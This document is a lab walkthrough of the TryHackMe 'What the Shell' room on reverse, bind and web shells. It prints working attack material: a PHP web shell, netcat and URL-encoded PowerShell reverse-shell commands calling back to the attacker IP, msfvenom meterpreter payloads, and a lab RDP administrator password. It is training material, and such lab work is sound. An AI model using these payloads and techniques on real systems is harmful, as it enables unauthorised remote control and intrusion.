...
Room link: [https://tryhackme.com/room/introtoshells](https://tryhackme.com/room/introtoshells)
...
![Reverse Shell Example](Images/Reverse_Shell_Example.png)
...
![Bind Shell Example](Images/Bind_Shell_Example.png)
...
![Interactive Shell Example](Images/Interactive_Shell_Example.png)
...
![Non-Interactive Shell Example](Images/Non-Interactive_Shell_Example.png)
...
![Shell Stabilisation with Python](Images/Shell_Stabilisation_with_Python.png)
...
![Stty Example](Images/Stty_Example.png)
...
![Socat Advanced Example](Images/Socat_Advanced_Example.png)
...
![Socat Encrypted Example](Images/Socat_Encrypted_Example.png)
...
![Common Shell Example 1](Images/Common_Shell_Example_1.png)
...
![Common Shell Example 2](Images/Common_Shell_Example_2.png)
...
![Common Shell Example 3](Images/Common_Shell_Example_3.png)
...
![Msfvenom Example](Images/Msfvenom_Example.png)
...
![Msfvenom Example 2](Images/Msfvenom_Example_2.png)
...
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o rev_shell.exe LHOST=tun0 LPORT=12345
...
![Metasploit multi/handler 1](Images/Metasploit_Multi_Handler_1.png)
...
![Metasploit multi/handler 2](Images/Metasploit_Multi_Handler_2.png)
...
![Metasploit multi/handler 3](Images/Metasploit_Multi_Handler_3.png)
...
![PHP Webshell Example](Images/PHP_Webshell_Example.png)
...
Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`
...
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ export TARGET_IP=10.65.183.33 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ sudo nmap -sV -sC $TARGET_IP  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 11:12 CET
Nmap scan report for 10.65.183.33
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:fb:d5:f2:cb:4a:24:af:18:55:24:33:3c:fc:b3:e7 (RSA)
|   256 f6:9e:63:9f:59:49:3c:53:d3:6d:13:38:0a:f1:2c:55 (ECDSA)
|_  256 5e:38:8b:19:ba:67:5d:4f:25:b6:f4:d7:6c:b5:6a:15 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Linux Uploads
...
Manually browsing to the web site show us we have the possibility to upload files:

![Web Page at What the Shell](Images/Web_Page_at_What_the_Shell.png)

Next, we create a minimal PHP web shell
...
We upload it and try it out with `id` (`http://10.65.183.33/uploads/web_shell.php?cmd=id`) which confirms we can execute code:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then we start a netcat listener on port 12345
...
before executing netcat as instructed (`http://10.65.183.33/uploads/web_shell.php?cmd=nc 192.168.187.183 12345 -e /bin/bash`)

Back at the netcat listener we can do some basic enumeration

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.65.183.33] 59058
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
ip-10-65-183-33
...
We start by preparing a PHP reverse shell to upload
...
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.187.183';  // CHANGE THIS
...
Then we upload the reverse shell through the web GUI:

![Revshell Uploaded on What the Shell](Images/Revshell_Uploaded_on_What_the_Shell.png)

Now we start a netcat listener on port 12345
...
Next, we trigger the reverse shell with curl

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ export TARGET_IP=10.65.159.77  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ curl http://$TARGET_IP/uploads/revshell.php
...
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.65.159.77] 59382
Linux ip-10-65-159-77 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 11:03:33 up 6 min,  0 users,  load average: 0.01, 0.16, 0.10
...
We also want to upgrade our shell to a TTY shell

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-65-159-77:/$ ^Z
...
www-data@ip-10-65-159-77:/$ export SHELL=bash
www-data@ip-10-65-159-77:/$ export TERM=xterm-256color
www-data@ip-10-65-159-77:/$ ^C
www-data@ip-10-65-159-77:/$ ^C
www-data@ip-10-65-159-77:/$ 
```

Now we have a shell with autocomplete that is `Ctrl + C` safe.

#### Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

Browsing to the Windows machine shows a similar `File Uploads` page as before

![Web Page at What the Shell Win](Images/Web_Page_at_What_the_Shell_Win.png)
...
and upload the same reverse shell as before.

Triggering it in the web broswer causes the following error messages:

```text
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\revshell.php on line 146
WARNING: Failed to daemonise. This is quite common and not fatal.
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\revshell.php on line 146
Successfully opened reverse shell to 192.168.187.183:12345
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\revshell.php on line 146
ERROR: Shell process terminated 
```

Back at the netcat listener we see a possible cause (the `uname` command)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ nc -lvnp 12345              
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.67.136.13] 49734
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

Let's try to fix it by modifying the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ cp revshell.php revshell_win.php                                      

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ vi revshell_win.php 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ head -n20 revshell_win.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
...
Triggering this modified shell yields no error messages but a non-functioning shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.67.136.13] 49780
Windows PowerShell 
...
We upload the previously used `web_shell.php` and test it via `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ curl "http://$TARGET_IP/uploads/web_shell.php?cmd=dir"
 Volume in drive C has no label.
 Volume Serial Number is 54F3-FF2D

 Directory of C:\xampp\htdocs\uploads

17/12/2025  12:21    <DIR>          .
17/12/2025  12:21    <DIR>          ..
17/12/2025  12:21                32 web_shell.php
               1 File(s)             32 bytes
               2 Dir(s)   4,422,311,936 bytes free
```
...
and use the URL-encoded PowerShell reverse shell as payload instead

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ curl "http://$TARGET_IP/uploads/web_shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.187.183%27%2C12345%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"

```

Back at the netcat listener we now have a shell connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.187.183] from (UNKNOWN) [10.64.165.238] 49778
whoami
nt authority\system
...
We start with creation of the meterpreter reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o meterpreter.exe LHOST=tun0 LPORT=12345
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
...
Then we upload the `meterpreter.exe` file via the web GUI.

Next, we create a multi/handler listener
...
[*] Started reverse TCP handler on 192.168.187.183:12345 
msf exploit(multi/handler) > 
```

and trigger the meterpreter shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/What_the_Shell]
└─$ curl "http://$TARGET_IP/uploads/web_shell.php?cmd=meterpreter.exe"   

```

Back in Metasploit we have a connection

```bash
msf exploit(multi/handler) > [*] Sending stage (203846 bytes) to 10.64.165.238
...
[*] Meterpreter session 1 opened (192.168.187.183:12345 -> 10.64.165.238:49992) at 2025-12-17 14:13:26 +0100
...
===============
  ...
  --  ----  ----                     -----------                       ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SHELLS  192.168.187.183:12345 -> 10.64.165.238:49992 (10.64.165.238)
...
[*] 10.64.165.238 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(multi/handler) > 
```
...
`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.65.183.33 /u:Administrator /p:'TryH4ckM3!'`
...
- [rlwrap - Linux manual page](https://linux.die.net/man/1/rlwrap)
